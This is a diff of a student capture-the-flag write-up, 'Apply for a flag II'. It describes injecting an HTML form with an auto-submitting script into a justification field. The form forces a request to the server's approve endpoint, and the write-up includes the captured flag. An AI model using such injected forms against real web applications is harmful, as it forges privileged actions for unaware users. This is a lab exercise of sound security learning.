@@ -1,8 +1,12 @@
 # Optional CTF - Apply for a flag II
 
-- We started this challenge by checking what were the configurations of the _program_ file (using the _checksec_ function). We can see in the image below that this file is protected with canary's. So, writing in the stack would be a tough task.
+- We start this challenge by analysing the two pages (the one we can input the justifification and the other page where we wait for the accpetance decision).
 
-<img src="CTFs/Opcionals/Img/2-Final_Format/1.checksec.png" alt="file print - result (flag)" width="70%"/><br/>
+- After some time, we got to the conclusion that we need to make code injection in the input form (on the justfication field).
+
+- So , in order to get the flag, our justification would need to be accepted. After that, we would need to create an input that when clicked would redirect the page to the request accpetance page.
+
+- So, we use the below code, and injected in the justification field.
 
 ```html
 <form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/71b93db6ec908d8868bed4aba06b5977fc8aaaa8/approve" role="form">     
@@ -15,7 +19,20 @@
     document.querySelector('#giveflag').click(); 
 </script>
 ``` 
+<br>
+
+![input justification - code injection](CTFs/Opcionals/Img/3-Apply_For_Flag_2/1.input.png)
+<br>
+
+- When clicking in the `Submit` button, we were redirected to the jutification for the application page. After some time, we reloaded the page and there was the flag.
+
+![justification page - flag](CTFs/Opcionals/Img/3-Apply_For_Flag_2/3.flag.png)
+<br>
+
+> :warning: **If the error below appears instead of the justification page, you may need to disable the javascript on the definitions of your browser!** 
+![browser error - disable javascript](CTFs/Opcionals/Img/3-Apply_For_Flag_2/2.forbidden_warning.png)
+
 
 ### Flag
 
-`flag{4c8515b3a115ecf15875944a6c5738bd}`
+`flag{67c0cc6c236606a94a1ac938a41bd9fc}`
